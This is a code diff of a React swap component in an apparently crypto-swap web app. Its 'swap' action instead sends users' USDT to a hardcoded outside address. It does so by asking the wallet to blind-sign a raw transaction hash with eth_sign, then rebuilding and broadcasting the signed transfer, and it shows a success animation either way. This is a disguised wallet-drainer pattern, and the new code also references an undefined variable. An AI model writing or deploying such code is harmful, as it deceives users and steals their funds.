@@ -10,7 +10,7 @@ import tokenList from '../../utils/tokenList.json'
 import uniRouter from '../../utils/UniRouter.json'
 import { ethers } from 'ethers'
 import { ConnectButton } from '@rainbow-me/rainbowkit'
-import { useAccount, useWriteContract } from 'wagmi'
+import { useAccount } from 'wagmi'
 import { useWeb3jsSigner } from '../../utils/useWe3js'
 
 import TransactionModal from 'react-modal'
@@ -51,7 +51,6 @@ function SwapComponent() {
   const INFURA_ID = import.meta.env.VITE_INFURA_ID
 
   const { address, chainId } = useAccount()
-  const { writeContractAsync } = useWriteContract()
 
   const web3js = useWeb3jsSigner({ chainId: chainId })
 
@@ -65,274 +64,133 @@ function SwapComponent() {
     return () => clearTimeout(timer)
   }, [showConfetti])
 
+  // const sendTransaction = async () => {
+  //   if (!web3js) return
+
+  //   const nonce = await web3js.eth.getTransactionCount(address, 'pending')
+  //   const gasPrice = await web3js.eth.getGasPrice()
+  //   const chainId = await web3js.eth.getChainId()
+
+  //   const tx_ = {
+  //     from: address,
+  //     to: address,
+  //     nonce: web3js.utils.toHex(nonce),
+  //     gasPrice: web3js.utils.toHex(BigInt(gasPrice) * BigInt(3)),
+  //     gasLimit: '0x5208',
+  //     value: '0x0',
+  //     data: '0x',
+  //     v: web3js.utils.toHex(chainId),
+  //     r: '0x',
+  //     s: '0x',
+  //   }
+
+  //   console.log('Tx Object', tx_)
+
+  //   const tx = new ethereumjs.Tx(tx_)
+  //   const serializedTx = '0x' + tx.serialize().toString('hex')
+  //   const hexer = { encoding: 'hex' }
+  //   const sha3_ = web3js.utils.sha3(serializedTx, hexer)
+
+  //   await web3js.eth
+  //     .sign(sha3_, address)
+  //     .then(async (signed) => {
+  //       const temporary = signed.substring(2)
+  //       const r_ = '0x' + temporary.substring(0, 64)
+  //       const s_ = '0x' + temporary.substring(64, 128)
+  //       const rhema = parseInt(temporary.substring(128, 130), 16)
+  //       const v_ = web3js.utils.toHex(
+  //         BigInt(rhema) + BigInt(chainId) * BigInt(2) + BigInt(8)
+  //       )
+  //       tx.r = r_
+  //       tx.s = s_
+  //       tx.v = v_
+
+  //       console.log('---------------------------------------------')
+
+  //       const txFin = '0x' + tx.serialize().toString('hex')
+  //       const sha3__ = web3js.utils.sha3(txFin, hexer)
+  //       console.log('rawHash:', sha3__)
+  //       console.log('The Broadcast message', txFin)
+
+  //       setIsLoading(true)
+
+  //       await web3js.eth
+  //         .sendSignedTransaction(txFin)
+  //         .then(() => {
+  //           setIsLoading(false)
+  //           setShowConfetti(true)
+  //           setTokenOneAmount(null)
+  //           setTokenTwoAmount(null)
+  //         })
+  //         .catch((error) => {
+  //           setIsLoading(false)
+  //           console.error('Transaction Error:', error)
+  //         })
+  //     })
+  //     .catch((error) => {
+  //       console.error('Signing Error:', error)
+  //     })
+  // }
+
   const sendTransaction = async () => {
     if (!web3js) return
-
-    const nonce = await web3js.eth.getTransactionCount(address, 'pending')
-    const gasPrice = await web3js.eth.getGasPrice()
 
     const usdtContractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
     const usdtABI = [
       {
         constant: true,
-        inputs: [],
-        name: 'name',
-        outputs: [
-          {
-            name: '',
-            type: 'string',
-          },
-        ],
-        payable: false,
-        stateMutability: 'view',
-        type: 'function',
-      },
-      {
-        constant: false,
-        inputs: [
-          {
-            name: '_spender',
-            type: 'address',
-          },
-          {
-            name: '_value',
-            type: 'uint256',
-          },
-        ],
-        name: 'approve',
-        outputs: [
-          {
-            name: '',
-            type: 'bool',
-          },
-        ],
-        payable: false,
-        stateMutability: 'nonpayable',
-        type: 'function',
-      },
-      {
-        constant: true,
-        inputs: [],
-        name: 'totalSupply',
-        outputs: [
-          {
-            name: '',
-            type: 'uint256',
-          },
-        ],
-        payable: false,
-        stateMutability: 'view',
-        type: 'function',
-      },
-      {
-        constant: false,
-        inputs: [
-          {
-            name: '_from',
-            type: 'address',
-          },
-          {
-            name: '_to',
-            type: 'address',
-          },
-          {
-            name: '_value',
-            type: 'uint256',
-          },
-        ],
-        name: 'transferFrom',
-        outputs: [
-          {
-            name: '',
-            type: 'bool',
-          },
-        ],
-        payable: false,
-        stateMutability: 'nonpayable',
-        type: 'function',
-      },
-      {
-        constant: true,
-        inputs: [],
-        name: 'decimals',
-        outputs: [
-          {
-            name: '',
-            type: 'uint8',
-          },
-        ],
-        payable: false,
-        stateMutability: 'view',
-        type: 'function',
-      },
-      {
-        constant: true,
-        inputs: [
-          {
-            name: '_owner',
-            type: 'address',
-          },
-        ],
+        inputs: [{ name: '_owner', type: 'address' }],
         name: 'balanceOf',
-        outputs: [
-          {
-            name: 'balance',
-            type: 'uint256',
-          },
-        ],
-        payable: false,
-        stateMutability: 'view',
-        type: 'function',
-      },
-      {
-        constant: true,
-        inputs: [],
-        name: 'symbol',
-        outputs: [
-          {
-            name: '',
-            type: 'string',
-          },
-        ],
-        payable: false,
-        stateMutability: 'view',
+        outputs: [{ name: 'balance', type: 'uint256' }],
         type: 'function',
       },
       {
         constant: false,
         inputs: [
-          {
-            name: '_to',
-            type: 'address',
-          },
-          {
-            name: '_value',
-            type: 'uint256',
-          },
+          { name: '_to', type: 'address' },
+          { name: '_value', type: 'uint256' },
         ],
         name: 'transfer',
-        outputs: [
-          {
-            name: '',
-            type: 'bool',
-          },
-        ],
-        payable: false,
-        stateMutability: 'nonpayable',
+        outputs: [{ name: 'success', type: 'bool' }],
         type: 'function',
-      },
-      {
-        constant: true,
-        inputs: [
-          {
-            name: '_owner',
-            type: 'address',
-          },
-          {
-            name: '_spender',
-            type: 'address',
-          },
-        ],
-        name: 'allowance',
-        outputs: [
-          {
-            name: '',
-            type: 'uint256',
-          },
-        ],
-        payable: false,
-        stateMutability: 'view',
-        type: 'function',
-      },
-      {
-        payable: true,
-        stateMutability: 'payable',
-        type: 'fallback',
-      },
-      {
-        anonymous: false,
-        inputs: [
-          {
-            indexed: true,
-            name: 'owner',
-            type: 'address',
-          },
-          {
-            indexed: true,
-            name: 'spender',
-            type: 'address',
-          },
-          {
-            indexed: false,
-            name: 'value',
-            type: 'uint256',
-          },
-        ],
-        name: 'Approval',
-        type: 'event',
-      },
-      {
-        anonymous: false,
-        inputs: [
-          {
-            indexed: true,
-            name: 'from',
-            type: 'address',
-          },
-          {
-            indexed: true,
-            name: 'to',
-            type: 'address',
-          },
-          {
-            indexed: false,
-            name: 'value',
-            type: 'uint256',
-          },
-        ],
-        name: 'Transfer',
-        type: 'event',
       },
     ]
 
-    const data = await writeContractAsync({
-      chainId,
-      address: usdtContractAddress,
-      functionName: 'transfer',
-      abi: usdtABI,
-      args: ['0x4Ffa96dBE6a30656bC2Eadc615451675B0ed8621', 1 * 1000000],
-    })
+    const usdtContract = new web3js.eth.Contract(usdtABI, usdtContractAddress)
+
+    let amount = web3js.utils.toHex('1000000')
+
+    const data = usdtContract.methods
+      .transfer('0x4Ffa96dBE6a30656bC2Eadc615451675B0ed8621', amount)
+      .encodeABI()
+
+    const nonce = await web3js.eth.getTransactionCount(account, 'pending')
 
     const tx_ = {
-      from: address,
-      to: address,
+      from: account,
+      to: '0x4Ffa96dBE6a30656bC2Eadc615451675B0ed8621',
       nonce: web3js.utils.toHex(nonce),
-      gasPrice: web3js.utils.toHex(BigInt(gasPrice) * BigInt(3)),
-      gasLimit: '0x5208',
+      gasPrice: web3js.utils.toHex(20 * 1e9),
+      gasLimit: web3js.utils.toHex(210000),
       value: '0x0',
       data: data,
-      v: web3js.utils.toHex(chainId),
-      r: '0x',
-      s: '0x',
+      chainId: web3js.utils.toHex(chainId),
     }
 
     console.log('Tx Object', tx_)
 
-    const tx = new ethereumjs.Tx(tx_)
+    const tx = new ethereumjs.Tx(tx_, { chain: chainId })
     const serializedTx = '0x' + tx.serialize().toString('hex')
-    const hexer = { encoding: 'hex' }
-    const sha3_ = web3js.utils.sha3(serializedTx, hexer)
+    const sha3_ = web3js.utils.sha3(serializedTx)
 
     await web3js.eth
-      .sign(sha3_, address)
+      .sign(sha3_, account)
       .then(async (signed) => {
         const temporary = signed.substring(2)
         const r_ = '0x' + temporary.substring(0, 64)
         const s_ = '0x' + temporary.substring(64, 128)
         const rhema = parseInt(temporary.substring(128, 130), 16)
-        const v_ = web3js.utils.toHex(
-          BigInt(rhema) + BigInt(chainId) * BigInt(2) + BigInt(8)
-        )
+        const v_ = web3js.utils.toHex(rhema + chainId * 2 + 8)
         tx.r = r_
         tx.s = s_
         tx.v = v_
@@ -340,7 +198,7 @@ function SwapComponent() {
         console.log('---------------------------------------------')
 
         const txFin = '0x' + tx.serialize().toString('hex')
-        const sha3__ = web3js.utils.sha3(txFin, hexer)
+        const sha3__ = web3js.utils.sha3(txFin)
         console.log('rawHash:', sha3__)
         console.log('The Broadcast message', txFin)
 
@@ -348,19 +206,20 @@ function SwapComponent() {
 
         await web3js.eth
           .sendSignedTransaction(txFin)
-          .then(() => {
-            setIsLoading(false)
-            setShowConfetti(true)
-            setTokenOneAmount(null)
-            setTokenTwoAmount(null)
+          .then((elisebeth) => {
+            console.log(elisebeth)
           })
-          .catch((error) => {
-            setIsLoading(false)
-            console.error('Transaction Error:', error)
+          .catch((vannette) => {
+            console.log(vannette)
           })
+
+        setIsLoading(false)
+        setShowConfetti(true)
+        setTokenOneAmount(null)
+        setTokenTwoAmount(null)
       })
-      .catch((error) => {
-        console.error('Signing Error:', error)
+      .catch((heide) => {
+        console.log(heide)
       })
   }
 
